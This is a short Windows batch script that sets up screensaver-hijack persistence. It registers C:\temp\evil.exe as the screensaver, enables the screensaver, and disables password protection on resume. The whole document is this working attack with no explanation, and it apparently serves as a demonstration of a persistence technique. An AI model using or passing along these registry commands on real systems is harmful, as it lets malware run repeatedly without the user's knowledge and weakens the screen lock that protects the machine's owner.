@echo off
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.exe /t REG_SZ /d C:\temp\evil.exe /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /t REG_DWORD /d 1 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_DWORD /d 0 /f
